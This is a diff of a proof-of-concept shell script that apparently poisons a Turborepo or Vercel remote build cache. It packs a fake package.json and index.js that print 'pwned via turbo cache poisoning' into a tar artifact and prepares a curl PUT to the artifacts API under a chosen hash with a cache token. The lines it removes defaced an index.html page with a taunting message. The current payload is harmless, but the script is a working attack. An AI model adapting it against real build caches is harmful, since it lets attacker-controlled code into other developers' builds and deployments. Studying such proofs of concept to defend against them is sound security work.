@@ -11,9 +11,11 @@ TOKEN="$VERCEL_ARTIFACTS_TOKEN"
 HASH="fa7e78dfab68d045"
 echo $TEAM
 
-mkdir -p public/
-echo "But you are not the only one on the road now mwahahahahaha" >> public/index.html
-tar -cf artifact.tar -C /vercel/path0 app/web/dist app/web/.turbo/turbo-build.log public/
+mkdir -p packages/web/dist packages/web/.turbo/turbo-build.log
+echo '{"name":"youuu","version":"4.1.0","main":"index.js","scripts":{"build":"echo \"pwned via turbo cache poisoning\""}}' > packages/web/dist/package.json
+echo 'console.log("pwned via turbo cache poisoning")' > packages/web/dist/index.js
+
+tar -cf artifact.tar -C packages/web/dist packages/web/.turbo/turbo-build.log 
 zstd -f artifact.tar
 
 echo "curl -sS -X PUT $API/v8/artifacts/$HASH?teamId=$TEAM"
